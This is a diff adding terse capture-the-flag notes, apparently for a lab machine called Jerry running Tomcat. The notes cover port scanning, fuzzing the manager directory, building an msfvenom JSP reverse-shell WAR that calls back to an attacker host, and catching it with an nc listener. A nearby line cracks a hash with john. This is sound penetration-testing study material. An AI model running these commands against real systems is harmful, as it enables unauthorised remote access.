@@ -13,7 +13,16 @@ john hash_admin -w=/usr/share/wordlists/rockyou.txt
 
 
 # Win-Jerry
-
+```
+nmap -p- -T5 10.10.10.95
+http://10.10.10.95:8080/
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.95:8080/manager/FUZZ -e .aspx,.php,.txt,.html,.sh
+http://10.10.10.95:8080/manager/html
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war -o revshell.war
+nc -nlvp 80
+http://10.10.10.95:8080/revshell/
+```
 
 
 # Win-Search
